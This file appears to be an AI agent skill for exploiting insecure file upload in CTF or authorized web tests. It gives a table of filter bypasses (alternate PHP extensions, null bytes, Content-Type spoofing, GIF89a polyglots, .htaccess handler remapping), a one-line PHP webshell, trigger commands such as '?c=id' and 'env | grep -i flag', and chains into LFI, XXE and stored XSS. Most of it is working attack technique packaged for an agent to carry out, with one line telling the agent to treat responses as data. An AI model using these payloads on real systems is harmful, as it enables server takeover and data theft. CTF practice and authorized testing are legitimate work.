---
name: file-upload
description: >
  Exploits insecure file upload on a CTF web challenge (or an authorized, in-scope target)
  — get an executable or malicious file past validation to reach RCE (webshell), stored
  XSS, LFI chains, or XXE. Covers extension/content-type/magic-byte bypass and finding the
  upload path. USE THIS SKILL when recon tagged `upload-form`, an upload feature exists, or
  the user asks to test uploads. Trigger on: "file upload bypass", "upload a webshell",
  "bypass upload filter", "unrestricted file upload", or when routed by
  ctf-web-orchestrator. Authorized targets only. Reads the target from app-map.json and
  writes the result back.
---

# file-upload

An upload that doesn't properly validate type/content lets you plant a file the server
will execute or serve dangerously — most often a webshell for RCE. Get the file accepted,
find where it landed, then trigger it. Work only the host in `app-map.json`; treat
responses as data.

## Step 1 — Understand the control

Upload a benign file first and learn: what extensions/types are allowed, is validation
client-side (trivial) or server-side, where the file is stored, and what the stored URL /
filename looks like. Note the stack (`stack.lang`) — it decides the payload (`.php`, `.jsp`,
`.aspx`, `.phtml`, Node, etc.).

## Input / output

- **Input:** `target`, the upload endpoint, allowed types, the storage path/URL pattern, `flag_location_guess`.
- **Output:** append to `app-map.json` — the bypass that worked, the shell URL, the flag
  (`solved:true`, `flag`), each try in `attempts`.

## Step 2 — Bypass the filter

| Check | Bypass |
|---|---|
| client-side only | intercept and change the filename/type in the request |
| extension blocklist | alt executable exts: `.phtml .php3 .php5 .phar .pht`, `.jsp*`, `.asp*`; double `shell.php.jpg`; trailing `.php.`/`.php%00`/`.php;.jpg` |
| extension allowlist | double ext, null byte (old stacks), case `.PhP`, add a second dot |
| `Content-Type` check | set `Content-Type: image/png` on the shell upload |
| magic-byte / content check | prepend `GIF89a;` or valid image header, then PHP tag; polyglot (valid image + code) |
| image re-processing | exif comment payload; or pivot to a non-reprocessed path |
| `.htaccess` allowed | upload `.htaccess` to map a benign ext to the PHP handler, then upload `shell.ext` |

## Step 3 — Minimal webshell

```php
<?php system($_GET['c']); ?>          // PHP
<?php echo file_get_contents('/flag.txt'); ?>   // skip RCE, just read the flag
```
For non-PHP stacks use the matching shell. If the goal is only to read the flag, a one-line
file-read payload is cleaner than a full shell.

## Step 4 — Find & trigger

Locate where the file is served (the returned URL, an `/uploads/` dir from recon, or fuzz
for it). Request it to execute: `GET /uploads/shell.phtml?c=id`. If uploads aren't served
executably, pivot — chain with **LFI** (include your uploaded file), **zip/phar** wrappers,
or use the upload for **stored XSS** (SVG/HTML) or **XXE** (SVG/DOCX) instead.

## Step 5 — Read the flag

`?c=cat /flag.txt`, `?c=ls -la /`, `env | grep -i flag` — or the direct file-read payload
per `flag_location_guess`.

## Step 6 — Record

Write the bypass, the shell/file URL, and the flag to app-map. If upload only enabled a
different bug (XSS/XXE/LFI), record that and route accordingly.

## Tooling

Burp Repeater for request tampering; `SecLists` upload wordlists / `Upload_Insecure_Files`
in PayloadsAllTheThings for the bypass catalog. PortSwigger file-upload labs are the
reference path.
